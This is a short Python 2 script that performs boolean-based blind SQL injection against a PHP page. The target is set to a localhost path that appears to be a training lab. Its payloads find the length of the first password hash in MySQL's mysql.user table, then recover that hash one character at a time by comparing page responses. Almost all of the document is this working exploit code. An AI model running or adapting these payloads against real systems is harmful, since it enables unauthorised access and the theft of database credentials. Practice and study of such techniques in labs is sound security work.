#-*-coding=utf-8-*-
import requests


str='abcdefghijklmnopqrstuvwxyz'

class Sql(object):
    def __init__(self):
        self.headers={
    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
        }
        self.url='http://127.0.0.1/train/person.php?id=1'
        self.str=list('abcdefghijklmnopqrstuvwxyz0123456789@_.*'+str.upper())
        self.html = requests.get(self.url,headers=self.headers).content #获取原始页面的内容


    #获取字符串长度
    def getlength(self):
       for i in range(100):
            payload=' and length((select password from mysql.user limit 0,1))={length} -- x'.format(length=i)
            result=requests.get(self.url+payload,headers=self.headers).content
            if result==self.html:
                print '\r[+]length is %d' %i
                return i
            else:
                print '\rtesting %d\b' %i,

    def getcontent(self):
        password=''
        _length = self.getlength()
        for i in range(int(_length)):
            i += 1
            print '\r to %d\b\r' %i,
            for _str in self.str:
                ascii_str=ord(_str)
                payload=' and ascii(mid((select password from mysql.user limit 0,1),{len},1))={ascii} -- x'.format(len=i,ascii=ascii_str)
                result = requests.get(self.url + payload, headers=self.headers).content
                if result==self.html:
                    password += _str
                    print '\r[+]runing... %s' % password
                    break

        print '\nresults:'+password

    def run(self):
        self.getcontent()


if __name__=='__main__':
    exploit=Sql()
    exploit.run()

